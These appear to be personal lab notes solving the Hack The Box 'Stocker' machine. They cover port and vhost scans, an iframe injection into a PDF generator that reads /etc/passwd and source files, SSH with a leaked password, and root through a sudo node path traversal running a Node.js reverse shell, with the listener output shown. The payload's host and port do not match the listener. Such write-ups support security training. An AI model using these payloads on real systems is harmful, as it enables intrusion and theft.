

``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Stocker]
└──╼ $sudo nmap -sC -sV 10.10.11.196
[sudo] password for ramdark: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 02:34 CST
Nmap scan report for 10.10.11.196
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Stocker]
└──╼ $su
Password: 
┌─[root@parrot]─[/home/ramdark/Documents/Hacking_Notes_RFC/HTB/Labs/Stocker]
└──╼ #echo 10.10.11.196 stocker.htb >> /etc/hosts

┌──[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Stocker]
└──╼ $gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/12 02:44:30 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
                                               
===============================================================
2023/06/12 02:44:47 Finished
===============================================================

``` 

in burpsuite
``` 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 12 Jun 2023 15:01:59 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: close
X-Powered-By: Express
ETag: W/"35-dSoXHzI9ahH+q/OIxdZmgx46d4I"

{"success":true,"orderId":"6487336775bc3b99670ccf4f"


http://dev.stocker.htb/api/po/6487336775bc3b99670ccf4f

title
<iframe src=/etc/passwd height=500 width=500></iframe>

"<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>"

in PDF
IHeardPassphrasesArePrettySecure

Data for login
username: Angoose
Password: IHeardPassphrasesArePrettySecure
``` 


``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Stocker]
└──╼ $ssh angoose@10.10.11.196
The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established.
ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.196' (ECDSA) to the list of known hosts.
angoose@10.10.11.196's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ nano flag.js

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

angoose@stocker:~$ cp flag.js /tmp/flag.js
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/flag.js 


``` 


``` bash

┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Stocker]
└──╼ $sudo nc -nvlp 9001
[sudo] password for ramdark: 
listening on [any] 9001 ...
connect to [10.10.14.193] from (UNKNOWN) [10.10.11.196] 55474
whoami
root
cd ~
ls -la
total 44
drwx------  6 root root 4096 Jan  9 10:42 .
drwxr-xr-x 20 root root 4096 Dec 23 16:58 ..
lrwxrwxrwx  1 root root    9 Dec  6  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Nov 19  2022 .bashrc
drwx------  3 root root 4096 Dec  6  2022 .cache
drwxr-xr-x  3 root root 4096 Dec  6  2022 .local
drwx------  3 root root 4096 Dec  6  2022 .mongodb
drwxr-xr-x  4 root root 4096 Dec  6  2022 .npm
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Dec 21 21:35 .selected_editor
-rw-r--r--  1 root root   13 Nov 19  2022 .vimrc
-rw-r-----  1 root root   33 Jun 12 15:12 root.txt
cat root.txt
040361d04c05523c3310d215caa3944a


``` 


+ [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)
